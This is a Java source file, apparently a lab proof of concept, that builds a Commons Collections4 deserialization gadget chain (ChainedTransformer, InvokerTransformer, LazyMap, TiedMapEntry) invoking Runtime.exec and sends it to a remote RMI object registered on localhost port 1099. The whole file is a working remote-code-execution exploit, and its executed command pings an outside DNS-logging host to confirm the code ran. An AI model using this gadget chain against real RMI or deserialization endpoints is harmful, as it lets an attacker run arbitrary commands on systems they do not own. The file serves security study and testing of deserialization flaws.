package client;

import common.IRemoteObject;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;
import java.lang.reflect.Field;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.HashMap;
import java.util.Map;

public class ClientAttackServer {

    private static HashMap getPayload() throws Exception {
        Class<?> clazz = Class.forName("java.lang.Runtime");
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(clazz),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"ping 6y7d5.cxsys.spacetab.top"}
                )
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","xxx");
        Map<Object,Object> lazyMap = LazyMap.lazyMap(map, chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "abc");
        HashMap<TiedMapEntry,Integer> entryMap = new HashMap<TiedMapEntry,Integer>();
        Class<?> clazzTiedMapEntry = tiedMapEntry.getClass();
        Field field = clazzTiedMapEntry.getDeclaredField("map");
        field.setAccessible(true);
        field.set(tiedMapEntry,new HashMap());
        entryMap.put(tiedMapEntry, 1);
        field.set(tiedMapEntry,lazyMap);
        return entryMap;
    }

    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
        IRemoteObject helloRemoteObject = (IRemoteObject)registry.lookup("helloRemoteObject");
        System.out.println(helloRemoteObject.sayHello(getPayload()));
    }
}